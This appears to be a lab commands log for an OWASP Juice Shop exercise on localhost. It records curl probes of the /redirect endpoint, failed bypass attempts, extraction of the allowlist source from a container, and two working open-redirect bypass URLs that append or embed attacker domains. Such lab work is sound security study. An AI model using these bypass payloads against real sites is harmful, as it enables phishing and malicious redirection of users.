# Commands Log - OWASP A10: Server-Side Request Forgery (Juice Shop)

## Setup
mkdir -p raw-output screenshots
touch README.md commands.md findings.md methodology.md remediation.md

## Initial recon - test redirect endpoint with an arbitrary external URL
curl -s -i "http://localhost:3000/redirect?to=https://example.com" \
  -o raw-output/redirect_test_external.txt

## Test with a URL seen in earlier admin config output (not on real allowlist)
curl -s -i "http://localhost:3000/redirect?to=https://owasp.slack.com" \
  -o raw-output/redirect_test_allowed.txt

## Failed bypass attempts (blind guesses before finding the real allowlist)
curl -s -i "http://localhost:3000/redirect?to=https://owasp.slack.com.attacker.com" \
  -o raw-output/redirect_bypass_1.txt
curl -s -i "http://localhost:3000/redirect?to=https://attacker.com?x=https://owasp.slack.com" \
  -o raw-output/redirect_bypass_2.txt
curl -s -i "http://localhost:3000/redirect?to=https://OWASP.SLACK.COM" \
  -o raw-output/redirect_bypass_3.txt

## Root cause discovery - extract actual route and validation source from container
docker cp owasp-juice-shop-a01:/juice-shop/build/routes/redirect.js ./raw-output/redirect.js
docker cp owasp-juice-shop-a01:/juice-shop/build/lib/insecurity.js ./raw-output/insecurity.js
grep -A 20 "redirectAllowlist" ./raw-output/insecurity.js

## Confirmed working exploit 1: allowed string used as URL prefix, attacker domain appended as suffix
curl -s -i "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop.attacker.com" \
  -o raw-output/redirect_bypass_startswith.txt

## Confirmed working exploit 2: allowed string buried anywhere in a fully attacker-controlled URL
curl -s -i "http://localhost:3000/redirect?to=https://evil-attacker-site.com/?x=https://github.com/juice-shop/juice-shop" \
  -o raw-output/redirect_bypass_includes_anywhere.txt

